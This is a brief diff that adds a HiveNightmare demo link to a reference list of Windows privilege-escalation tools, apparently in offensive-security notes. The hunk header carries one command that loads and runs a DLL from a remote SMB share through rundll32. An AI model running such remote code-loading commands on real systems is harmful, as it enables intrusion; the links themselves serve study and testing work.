@@ -208,6 +208,7 @@ rundll32.exe \\10.10.X.X\share\nsfw.dll,ReflectEntry
 - [PrintSpoofer (Original)](https://github.com/itm4n/PrintSpoofer/tree/master)
 - [HiveNightmare](https://github.com/GossiTheDog/HiveNightmare)
 - [Mitre Attck T1055](https://attack.mitre.org/techniques/T1055/001/)
+- [Hivenightmare demo](https://doublepulsar.com/hivenightmare-aka-serioussam-anybody-can-read-the-registry-in-windows-10-7a871c465fa5)
 
 ---
 
